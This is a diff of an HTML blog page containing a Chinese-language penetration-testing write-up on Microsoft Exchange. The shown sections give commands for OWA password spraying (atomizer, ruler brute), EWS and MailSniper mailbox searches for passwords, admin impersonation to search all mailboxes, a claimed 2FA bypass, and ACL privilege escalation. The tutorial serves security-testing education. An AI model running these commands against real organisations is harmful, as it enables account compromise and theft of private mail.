-<p>搜索某字符串：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewhost/ews/Exchange.asmx -Mode SearchMail -String vpn</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:2878px"><div class="progress-images--placeholder" style="padding-bottom: 19.944405837387073%;"></div><img src="/images/loading.svg" alt="-w1439" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010976996.jpg" data-thumb="/images/thumb/d3eb163a0f804c3e7a2e48787dd6fe06.jpg"></div><p></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atomizer.py owa autodiscoverhost password user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010998743.jpg" alt="-w747"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler --domain autodiscoverhost -k brute --users user.txt --passwords pass.txt --delay 0 --threads 10 -v</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010951921.jpg" alt="-w877"></p>
+<h2 id="0x04-Search-mail"><a href="#0x04-Search-mail" class="headerlink" title="0x04 Search mail"></a>0x04 Search mail</h2><p>在获取到某用户邮箱账号密码以后，我们可以对其邮件内容进行搜索，除了直接登录邮件外，也可以使用Exchange的接口进行邮件的检索，其接口的相关开发可以参考《<a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS" target="_blank" rel="noopener">Exchange Web Service(EWS)开发指南</a>%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/)》，在外网情况下，可使用此工具来列出邮件内容。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewshost/ews/Exchange.asmx -Mode ListMail -Folder Inbox</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010921519.jpg" alt="-w959"></p>
+<p>搜索某字符串：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewhost/ews/Exchange.asmx -Mode SearchMail -String vpn</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010976996.jpg" alt="-w1439"></p>
 <p>或者使用MailSniper的Invoke-SelfSearch添加<code>-remote</code> 参数，输入账号密码即可。使用接口可以<code>bypass一些owa的2FA</code>。</p>
-<p>内网情况下可使用MailSniper来快速检索，如使用xiaoming\domain用户登录某主机，可在该主机上搜索xiaoming的邮箱（不需要密码）<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv <span class="number">1</span>.csv</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:1682px"><div class="progress-images--placeholder" style="padding-bottom: 58.62068965517241%;"></div><img src="/images/loading.svg" alt="-w841" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010993350.jpg" data-thumb="/images/thumb/85f627184ced2136af7eadca4a39f7b0.jpg"></div><p></p>
+<p>内网情况下可使用MailSniper来快速检索，如使用xiaoming\domain用户登录某主机，可在该主机上搜索xiaoming的邮箱（不需要密码）<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv <span class="number">1</span>.csv</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993350.jpg" alt="-w841"></p>
 <p>如果获得了域管理员的密码，可以检索任意邮件的内容：</p>
-<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator  -AdminPassword password -Term <span class="string">"*pass*"</span> -Folder all</span><br></pre></td></tr></tbody></table></figure>
-<p></p><div class="progress-images" style="width:1510px"><div class="progress-images--placeholder" style="padding-bottom: 59.735099337748345%;"></div><img src="/images/loading.svg" alt="1547034512542.jpg" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2019/01/2965525239.jpg" data-thumb="/images/thumb/32a2f02e998c70a2ca74e842951ea87c.jpg"></div><p></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator  -AdminPassword password -Term <span class="string">"*pass*"</span> -Folder all</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io/usr/uploads/2019/01/2965525239.jpg" alt="1547034512542.jpg"></p>
 <blockquote>
 <p>检索可使用<code>-Term</code>或者正则<code>-Regex</code>来指定关键字，<code>-ImpersonationAccount</code>用于将当前用户身份合法伪装其他邮箱用户，进而获得查询所有邮箱用户邮件的权限，如果查询失败，可以尝试添加<code>-ExchangeVersion</code>更换Exchange版本,目前支持版本为<code>Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013,Exchange2013_SP1</code></p>
 </blockquote>
-<h2 id="0x05-后渗透"><a href="#0x05-后渗透" class="headerlink" title="0x05 后渗透"></a>0x05 后渗透</h2><p>在获取一个用户的账号密码之后，如何进入内网？这里有一个神器<strong><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a></strong>,在Outlook中有一个Rules and Alerts的功能，利用此功能，可执行一些特定的如执行命令等操作，关于ruler的具体使用，可以参考相关文章，另外在内网中，如何去发现Exchange服务器，如何使用NTLM中继来接管某用户邮箱的权限，这些内容在<a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&isappinstalled=0" target="_blank" rel="noopener">《深入Exchange Server在网络渗透下的利用方法》</a>中有了很详细的讲解，在这里就不多做阐述。</p>
+<h2 id="0x05-后渗透"><a href="#0x05-后渗透" class="headerlink" title="0x05 后渗透"></a>0x05 后渗透</h2><p>在获取一个用户的账号密码之后，如何进入内网？这里有一个神器<strong><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a></strong>,在Outlook中有一个Rules and Alerts的功能，利用此功能，可执行一些特定的如执行命令等操作，关于ruler的具体使用，可以参考相关文章，另外在内网中，如何去发现Exchange服务器，如何使用NTLM中继来接管某用户邮箱的权限，这些内容在<a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">《深入Exchange Server在网络渗透下的利用方法》</a>中有了很详细的讲解，在这里就不多做阐述。</p>
 <p>另外需要补充一点可能有用的东西，Exchange安装以后会创建一个<code>Organization Management</code> 安全组：</p>
-<p></p><div class="progress-images" style="width:1300px"><div class="progress-images--placeholder" style="padding-bottom: 98%;"></div><img src="/images/loading.svg" alt="-w650" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010940263.jpg" data-thumb="/images/thumb/612f2e93bc35caac0dab00da9446b490.jpg"></div><p></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010940263.jpg" alt="-w650"></p>
 <p>该组内的成员除了访问Exchagne设置外，可以修改其他Exchagne安全组的成员身份，如<code>Exchange Trusted Subsystem</code>,此组为<code>Exchange Windows Permissions</code>的成员</p>
-<p></p><div class="progress-images" style="width:954px"><div class="progress-images--placeholder" style="padding-bottom: 64.57023060796645%;"></div><img src="/images/loading.svg" alt="-w477" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010993399.jpg" data-thumb="/images/thumb/e0a974ddc0713b0205b8dc87c9a40dc9.jpg"></div><p></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993399.jpg" alt="-w477"></p>
 <p>默认情况下，<code>Exchange Windows Permissions</code>安全组对安装Exchange的域的域对象具有writeDACL权限,这就意味着，我们可以进行权限的提升，详细的文章可以参考<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">《Escalating privileges with ACLs in Active Directory》</a>。</p>
 <h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文记录了我自己对Exchange在渗透中的利用的一些方式的总结，欢迎补充，更详细的内容可以查看参考的文章。</p>
 <h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><ol>
-<li><a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&isappinstalled=0" target="_blank" rel="noopener">https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&isappinstalled=0</a></li>
+<li><a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0</a></li>
 <li><a href="https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/</a></li>
 <li><a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/</a></li>
 <li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></li>
@@ -981,7 +998,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -992,7 +1009,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1003,7 +1020,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1014,7 +1031,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -1066,7 +1083,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1128,8 +1145,6 @@
 
 
 
-  
-
 
 
 
@@ -1158,9 +1173,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1604,11 +1616,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1748,6 +1755,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
